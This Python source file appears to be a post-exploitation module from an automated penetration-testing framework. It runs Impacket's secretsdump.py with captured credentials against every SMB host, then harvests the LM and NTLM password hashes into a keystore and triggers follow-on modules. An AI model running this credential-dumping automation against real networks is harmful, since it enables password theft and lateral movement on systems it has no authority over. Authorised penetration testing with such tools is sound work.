from core.actionModule import actionModule
from core.keystore import KeyStore
from core.utils import Utils


class post_impacketsecretsdump(actionModule):
    def __init__(self, config, display, lock):
        super(post_impacketsecretsdump, self).__init__(config, display, lock)
        self.title = "Dump passwords and hashes"
        self.shortName = "secretsDump"
        self.description = "execute [sectredsdump.py [user]:[password]@[target] on each target"

        self.requirements = ["secretsdump.py"]
        self.triggers = ["newSmbPassword"]
        self.types = ["passwords"]

        self.safeLevel = 5

    def getTargets(self):
        # we are interested in all hosts
        self.targets = KeyStore.get('port/tcp/139', 'port/tcp/445')

    def process(self):
        self.getTargets()
        for t in self.targets:
            users = self.getUsers(t)
            self.display.verbose(f"{self.shortName} - Connecting to {t}")
            for user in users:
                if not self.seentarget(t + str(user)):
                    self.addseentarget(t + str(user))
                    passwords = KeyStore.get([f'creds/host/{t}/username/{user}/password'])
                    for password in passwords:
                        self.display.verbose(f"{self.shortName} - Connecting to {t}")
                        temp_file = self.config["proofsDir"] + self.shortName + "_" + t + "_" + user + "_" + \
                                    Utils.getRandStr(10)

                        command = self.config["secretsdump.py"] + " -outputfile " + temp_file + ' \"' + user + \
                                  '\":\"' + password + '\"@' + t
                        result = Utils.execWait(command, None)
                        if Utils.isReadable(f'{temp_file}.sam'):
                            with open(f'{temp_file}.sam', "r") as myfile:
                                result = myfile.readlines()
                            for line in result:
                                m = line.split(':')
                                user = m[0].strip()
                                uid = m[1].strip()
                                lmhash = m[2].strip()
                                ntlmhash = m[3].strip()
                                KeyStore.add(f"creds/host/{t}/username/{user}/lmhash/{lmhash}")
                                KeyStore.add(f"creds/host/{t}/username/{user}/ntlmhash/{ntlmhash}")
                                KeyStore.add(f"creds/host/{t}/username/{user}/fullhash/{lmhash}:{ntlmhash}")
                                self.fire("newNTLMHash")
        return
